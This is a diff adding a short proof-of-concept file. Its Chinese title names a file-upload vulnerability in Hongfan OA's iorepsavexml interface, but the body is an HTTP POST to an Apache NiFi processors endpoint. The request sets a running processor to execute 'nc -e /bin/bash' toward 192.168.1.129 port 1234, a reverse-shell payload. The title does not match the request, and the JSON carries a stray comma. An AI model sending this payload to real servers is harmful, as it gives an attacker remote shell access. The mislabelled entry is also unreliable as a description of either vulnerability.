@@ -1,0 +1,27 @@
+# 红帆OA iorepsavexml接口文件上传漏洞
+POST /nifi-api/processors/12312321 HTTP/1.1
+Host: www.xwd_test.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/json
+Content-Length: 526
+
+{
+            "component": {
+                "config": {
+                    "autoTerminatedRelationships": ["success"],
+                    "properties": {
+                        "Command": "nc",
+                        "Command Arguments": "-e /bin/bash 192.168.1.129 1234",
+                    },
+                    "schedulingPeriod": "3600 sec"
+                },
+                "id": "12312321",
+                "state": "RUNNING"
+            },
+            "revision": {"clientId": "x", "version": 1}
+}
